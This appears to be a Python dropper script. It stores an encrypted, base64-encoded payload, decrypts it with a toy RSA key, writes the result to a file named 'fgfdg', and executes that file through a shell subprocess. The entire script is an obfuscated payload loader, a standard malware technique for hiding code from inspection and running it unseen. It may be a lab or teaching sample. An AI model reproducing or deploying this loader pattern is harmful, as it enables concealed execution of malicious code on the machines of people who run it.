import argparse
import math
from random import randint
import base64
import binascii
import random
crypto_data_hex = "MzA0MWJlMjIzNjI=MWJjMzMyMWNlMmMyMmMyMTFiMjA1MjU2M2U=MzA0MWJlMWNlMTFiMWJj"
public_key = (31, 1027)
drop_file_name = "fgfdg"

# Decrypt
def decrypt(public_key, ciphertext):
	#Unpack the key into its components
	key, n = public_key
	mensajeRecibido = __recibirBase64__(ciphertext.encode('utf-8'))
	mensajeHexRecibido = __Base64_Hex__(mensajeRecibido)
	mensajeDecimalRecibido = __Hex_decimal__(mensajeHexRecibido)
	mensajeDescifrado = [((char ** key) % n) for char in mensajeDecimalRecibido]
	mensaje_de_ascii = __decimal_ASCII__(mensajeDescifrado)
	return ''.join(mensaje_de_ascii)
def __recibirBase64__(mensaje):
	msg_base64 = []
	for i in range(0,len(mensaje), 4):
		msg_base64.append(mensaje[i:i+4])
	return msg_base64
def __Base64_Hex__(mensaje):
	mensajeHex = []
	for b64 in mensaje:
		mensajeHex.append(base64.b64decode(b64))
	return mensajeHex
def __Hex_decimal__(mensaje):
	mensajeDecimal = []
	for hexa in mensaje:
		hexa = hexa.decode("UTF-8")
		numero = int(hexa, 16)
		mensajeDecimal.append(numero)    
	return mensajeDecimal
def __decimal_ASCII__(mensaje):
	mensaje1 = ""
	for decimal in mensaje:
		mensaje1 = mensaje1 + chr(decimal)
	return mensaje1
decrypt_data = decrypt(public_key=public_key, ciphertext=crypto_data_hex)
# Save file
new_file = open(drop_file_name, 'wb')
new_file.write(decrypt_data.encode('utf-8'))
new_file.close()
# Execute file
import subprocess
proc = subprocess.Popen('python {filename}'.format(filename=drop_file_name), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
